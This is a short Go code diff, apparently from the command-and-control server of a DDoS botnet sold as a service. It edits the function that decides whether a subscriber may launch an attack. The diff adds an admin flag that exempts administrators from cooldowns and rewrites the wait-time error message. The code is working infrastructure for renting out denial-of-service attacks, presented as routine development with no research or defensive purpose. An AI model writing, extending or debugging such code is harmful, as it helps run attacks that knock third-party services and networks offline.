@@ -206,23 +206,23 @@ func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
 }
 
 func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
-    rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE username = ?", username)
+    rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
     defer rows.Close()
     if err != nil {
         fmt.Println(err)
     }
-    var userId, durationLimit, cooldown uint32
+    var userId, durationLimit, admin, cooldown uint32
     if !rows.Next() {
         return false, errors.New("Your access are terminated, please Renew it for send command again.")
     }
-    rows.Scan(&userId, &durationLimit, &cooldown)
+    rows.Scan(&userId, &durationLimit, &admin, &cooldown)
 
     if durationLimit != 0 && duration > durationLimit {
         return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
     }
     rows.Close()
 
-    if allowConcurrent == 0 {
+    if admin == 0 {
         rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
         if err != nil {
             fmt.Println(err)
@@ -230,7 +230,7 @@ func (this *Database) CanLaunchAttack(username string, duration uint32, fullComm
         if rows.Next() {
             var timeSent, historyDuration uint32
             rows.Scan(&timeSent, &historyDuration)
-            return false, errors.New(fmt.Sprintf("Number of slots used 1/1", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())))
+            return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())))
         }
     }
 
